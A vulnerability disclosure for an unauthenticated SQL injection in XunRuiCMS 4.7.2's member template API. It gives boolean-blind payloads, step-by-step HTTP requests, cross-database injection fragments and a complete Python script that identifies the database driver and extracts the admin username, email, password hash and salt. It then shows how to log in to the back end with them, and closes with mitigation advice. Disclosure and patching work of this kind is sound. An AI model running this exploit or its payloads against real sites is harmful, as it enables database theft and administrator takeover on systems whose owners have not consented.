# VulDB Submission — XunRuiCMS Unauthenticated SQL Injection in the Member Template API (credential disclosure of the back-end account)

**Vendor:** XunRuiCMS (四川迅睿云软件开发有限公司 / Sichuan XunRui Cloud Software Co., Ltd.)

**Product:** XunRuiCMS / XunRuiPHP (CodeIgniter 4 based CMS)

**Version:** 4.7.2 (verified on 4.7.2; reproduced on an independent Linux/Docker deployment — Apache 2.4.54, PHP 7.4.33, MySQL 8.0.46)

**Class:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) — Unauthenticated (pre-auth) SQL Injection; leads to arbitrary database read access and to disclosure of the back-end account password hash

---

## Description

**Summary**

The front-end member API controller `dayrui/App/Member/Controllers/Api.php::template()` (`template()` at line 263) assigns **all request parameters as template variables** and renders the requested template without any authentication:

```php
public function template() {
    $app    = dr_safe_filename(\Phpcmf\Service::L('input')->get('app'));
    $file   = dr_safe_filename(\Phpcmf\Service::L('input')->get('name'));
    $module = dr_safe_filename(\Phpcmf\Service::L('input')->get('module'));
    ...
    \Phpcmf\Service::V()->assign(\Phpcmf\Service::L('input')->get('', true));   // every GET parameter becomes a template variable
    \Phpcmf\Service::V()->display($file);
```

The shipped template `list.html` calls the list tag with an unvalidated `$catid`:

```
{list action=module catid=$catid page=1}
```

`$catid` therefore reaches `View::list_tag()` (`dayrui/Fcms/Core/View.php:962`) as part of the tag parameter string. `list_tag()` extracts the `where` attribute with a regular expression and concatenates it **verbatim** into the SQL query (`View.php:1008`):

```php
if (preg_match('/where=\'(.+)\'/sU', $_params, $match)) {
    $where = $match[1];       // used as-is by the module action when building the SQL
}
```

Because `catid` is never cast to an integer and `module`/`where` are not stripped, an unauthenticated attacker fully controls the `WHERE` clause:

```
GET /index.php?s=member&c=api&m=template&name=list.html&catid=201 module=news where='<SQL>'
```

The hardened twin implementation in the core directory (`dayrui/Fcms/Control/Api/Api.php`, `template()` at line 368) performs the integer cast and sanitises the tag parameters; the member application copy does not, which is why the issue exists in the shipped application code.

**Verification of the injection (not a length artefact)**

| Test | Request (`where` fragment) | Result | Purpose |
|---|---|---|---|
| Baseline | `201 module=news` (no injection) | HTTP 200 / 34939 bytes | normal list |
| TRUE / FALSE | `1=1` / `1=0` | 34730 / 2033 | boolean difference |
| **Same-length control** | `1=1 AND 1=1` vs `1=1 AND 1=2` (both 11 chars, 3 repetitions each) | 34730 / 2033 (stable) | rules out length/string-based artefacts |
| Scalar sub-query | `(SELECT 1)=1` vs `(SELECT 2)=1` | TRUE / FALSE | sub-query is really evaluated |
| **Unknown column** | `1=1 AND nosuchcolumn_zz=1` | **HTTP 500** (valid expression: 200) | the text is parsed by the database as SQL |
| Real data oracle | `SUBSTRING((SELECT username FROM dr_member WHERE id=1),1,1)=0x61` | TRUE; `0x62` → FALSE | can read real data |

No SQL error text is returned (the 500 page is a generic error page), so extraction is performed with a **boolean-blind** technique: the response `Content-Length` is used as the oracle. Note that the input filter mangles both the `>` character and the `LENGTH` keyword (and therefore `CHAR_LENGTH` as well), so every comparison is written as `SIGN(a-b)=1` and no `LENGTH()` call is used (the value length is found with the existence probe `SIGN(ASCII(SUBSTRING(...))-31)=1`).

**Data extracted from the database (blind, binary search)**

| Target | Value |
|---|---|
| `version()` / `database()` | `8.0.46` / `xunruicms` |
| `username` (`dr_member.id=1`) | `admin` |
| `email` | `admin@admin.com` |
| `password` (stored hash) | `c67356deed081cca376fe8ec4fa0bf7b` |
| `salt` | `01b7cd4dc6` |

Self-check: with `md5('admin') = 21232f297a57a5a743894a0e4a801fc3`, the framework's scheme `md5(md5(pass).salt.md5(pass))` yields `md5('21232f297a57a5a743894a0e4a801fc3' + '01b7cd4dc6' + '21232f297a57a5a743894a0e4a801fc3') = c67356deed081cca376fe8ec4fa0bf7b`, byte-identical to the extracted hash — the extraction is exact. (The stored hash and salt are regenerated whenever the password changes; the extraction can simply be re-run.)

**Impact**

Any anonymous visitor can read arbitrary data from the database (configuration, members, orders, message contents, …) and in particular the back-end account's MD5 password hash and salt, which can be cracked or (as demonstrated) reversed. The recovered credentials give a full back-end (administrator) session provided the randomly named installer entry file is known or recoverable; that randomisation raises the bar for immediate interactive login but is not a security control against credential theft. The readable data includes site configuration, member records and any business data stored by the CMS.

Environment note: on the tested deployment the database account has no `FILE` privilege and the database runs in a separate container, so `SELECT … INTO OUTFILE` cannot be used to drop a web shell (`SQLSTATE[42000] 1227 Access denied; you need … FILE privilege`). Write-based exploitation therefore depends on the environment, while read-based exploitation (credential theft) works regardless.

**Proof of Concept**

Step 1 — boolean oracle (unauthenticated):

```
GET /index.php?s=member&c=api&m=template&name=list.html&catid=201%20module%3Dnews%20where%3D%271%3D1%20AND%201%3D1%27 HTTP/1.1
Host: <target>
-> HTTP/1.1 200 OK   Content-Length: 34730        (TRUE)

GET …&catid=201%20module%3Dnews%20where%3D%271%3D1%20AND%201%3D2%27 HTTP/1.1
Host: <target>
-> HTTP/1.1 200 OK   Content-Length: 2033         (FALSE)
```

Step 2 — confirm that the fragment is executed by the database:

```
GET …&catid=201%20module%3Dnews%20where%3D%271%3D1%20AND%20nosuchcolumn_zz%3D1%27 HTTP/1.1
Host: <target>
-> HTTP/1.1 500 Internal Server Error
```

Step 3 — blind extraction (per character, binary search, ≈7 requests/char):

```
condition: 1=1 AND SIGN(ASCII(SUBSTRING((SELECT <column> FROM dr_member WHERE id=1),<pos>,1))-<mid>)=1
result:    username = admin
           email    = admin@admin.com
           password = c67356deed081cca376fe8ec4fa0bf7b
           salt     = 01b7cd4dc6
```

The fragments above are the MySQL flavour used in this lab (`MySQL 8.0.46`); the cross-driver equivalents (SQLite3 `UNICODE`/`SUBSTR`, Postgre and SQLSRV `ASCII`/`SUBSTRING`) and a driver-auto-detecting implementation are given in the *Cross-database adaptation* section below.

Step 4 — log in to the back end with the recovered credentials:

```
POST /<entry>.php?c=login&m=index HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

data[username]=admin&data[password]=21232f297a57a5a743894a0e4a801fc3&data[mode]=1
-> {"code":1,"msg":"ok","data":{"url":"admin82b8542a912e.php?time=…"}}
```

The back-end entry file is *randomly named* by the installer (here `admin82b8542a912e.php`); the default `admin.php` is usually removed, so use the real name. (The SQL injection itself is unauthenticated and needs no back end at all — this step only shows what the stolen credentials allow.)

**Cross-database adaptation (MySQLi / SQLite3 / Postgre / SQLSRV)**

The vulnerability is database-independent: the CMS ships drivers for MySQL/MariaDB (`MySQLi`), `SQLite3`, `Postgre` and `SQLSRV` (`dayrui/CodeIgniter72/System/Database/*`, `dayrui/Fcms/Control/Install.php`), and the schema of all of them is generated from the same PHP field definitions (`dayrui/Fcms/Config/Install.php`). The table and column names used here (`dr_member.username / email / password / salt`) are therefore identical on every driver — only the *payload dialect* has to be adapted.

Credential storage is PHP-side as well: `password` holds `md5(md5(pass).salt.md5(pass))` and `salt` the random salt on every driver, so the extracted hash/salt pair is directly usable (or crackable) no matter which DBMS is installed.

Constraints imposed by the PHP layer (identical on every driver):

| Constraint | Cause | Consequence for the payload |
|---|---|---|
| No inner `'` or `"` | `View::list_tag()` extracts the fragment with `/where='(.+)'/sU` — the first inner quote ends the capture | no string literals; use numeric literals (`0x61`, `97`) instead |
| `<`, `>`, `;` do not survive | the raw query array is assigned into the template via `Input::get('', true)` → `xss_clean()`, which mangles them (each yields an SQL error) | never use `<` / `>` / `;`; compare with `BETWEEN` (or `SIGN(a-b)=1`) |
| `--` and `/* … */` survive | not filtered | usable |
| Stacked statements are unreachable | `;` is mangled and CI4 sends single statements | the driver escalations below cannot be reached through this vector |

Driver-specific fragments (the PHP-side payload shape stays the same):

| Driver | Detection probe (TRUE only on that driver) | char code | substring | length |
|---|---|---|---|---|
| MySQLi (MySQL/MariaDB) | `1=1 AND @@version_comment=@@version_comment` | `ASCII(x)` | `SUBSTRING(x,i,1)` | `LENGTH(x)` |
| SQLite3 | `1=1 AND sqlite_version()=sqlite_version()` | `UNICODE(x)` | `SUBSTR(x,i,1)` | `LENGTH(x)` |
| Postgre | `1=1 AND current_database()=current_database()` | `ASCII(x)` | `SUBSTRING(x,i,1)` | `LENGTH(x)` |
| SQLSRV | `1=1 AND DB_NAME()=DB_NAME()` | `ASCII(x)` | `SUBSTRING(x,i,1)` | `LEN(x)` |

The script below uses the portable comparison `expr BETWEEN m+1 AND 126` (a strict greater-than without the `>` character) plus the existence probe `expr BETWEEN 1 AND 126` (an out-of-range `ascii()`/`unicode()` is `0`/`NULL`, both falsy), so no driver-specific length function is needed.

Verification matrix:

| Driver | How it was verified | Result |
|---|---|---|
| MySQLi | against the live lab over real HTTP (`MySQL 8.0.46`) | `driver = MySQLi`; all four fields extracted |
| SQLite3 | same predicate + same algorithm executed directly on a local SQLite engine holding the same row | identical values extracted |
| Postgre / SQLSRV | dialect-mapped only (every fragment is standard SQL); not executed in this lab | not executed |

Driver-dependent escalation (context only — none of it is reachable through this *read-only* vector): MySQL `INTO OUTFILE` (needs `FILE`, disabled here), PostgreSQL `COPY … TO PROGRAM` (needs superuser), SQL Server `xp_cmdshell` (needs `sysadmin`), SQLite no file-write primitive. On every driver the confirmed impact stays a full data read-out — i.e. credential theft, which is already enough to take over the back end (step 4).

**PoC script (`3.py`)**

```
python 3.py http://<target>
```

```python
import sys, requests

b = sys.argv[1].rstrip("/")
u = b + "/index.php?s=member&c=api&m=template&name=list.html&catid=201 module=news where='"
s = requests.Session()

DBS = {
    "MySQLi":  ("1=1 AND @@version_comment=@@version_comment", "ASCII(SUBSTRING({},%d,1))"),
    "SQLite3": ("1=1 AND sqlite_version()=sqlite_version()", "UNICODE(SUBSTR({},%d,1))"),
    "Postgre": ("1=1 AND current_database()=current_database()", "ASCII(SUBSTRING({},%d,1))"),
    "SQLSRV":  ("1=1 AND DB_NAME()=DB_NAME()", "ASCII(SUBSTRING({},%d,1))"),
}


def t(x):
    return len(s.get(u + x + "'", timeout=25).text) > 20000


db = "?"
for k in ("MySQLi", "SQLite3", "Postgre", "SQLSRV"):
    if t(DBS[k][0]):
        db = k
        break
print("driver =", db, flush=True)
if db == "?":
    sys.exit(1)
c = DBS[db][1]


def q(sql):
    v = c.format("(" + sql + ")")
    r = ""
    for i in range(1, 65):
        e = v % i
        if not t("1=1 AND %s BETWEEN 1 AND 126" % e):
            break
        a, z = 32, 126
        while a < z:
            m = (a + z) // 2
            if t("1=1 AND %s BETWEEN %d AND 126" % (e, m + 1)):
                a = m + 1
            else:
                z = m
        r += chr(a)
    return r


print("TRUE ", t("1=1 AND 1=1"))
print("FALSE", t("1=1 AND 1=2"))
print("UNKNOWN-COLUMN HTTP", s.get(u + "1=1 AND nosuchcolumn_zz=1'").status_code)

for f in ("username", "email", "password", "salt"):
    print("%-8s =" % f, q("SELECT %s FROM dr_member WHERE id=1" % f), flush=True)
```

**Mitigation**

1. Cast `catid` (and every other identifier taken from request parameters) to an integer before it is used in a template tag, and strip tag attributes such as `module`, `where`, `order`, `action` from template variables (`View::assign()` of the raw request array must not be reachable from an anonymous controller).
2. In `View::list_tag()`, parse tag parameters structurally and pass the `where` fragment through the query builder/parameter binding instead of concatenating it into the SQL string.
3. Keep the application-level `Api` controller in sync with the hardened core implementation (`Fcms/Control/Api/Api.php` already performs the integer cast).
4. Do not expose debug/500 pages that help distinguish errors; monitor for large volumes of identical list requests (blind injection fingerprint).
5. Enforce least privilege for the database account (no `FILE`, no `DROP`) so that a SQL injection cannot write files even when `secure_file_priv` allows it.
6. The fix is driver-independent: do not rely on driver-level escaping (`escape()` / `escapeLikeString()`) — bind or reject the `where` fragment and harden the tag parser (`catid` integer cast) uniformly for all four supported drivers.
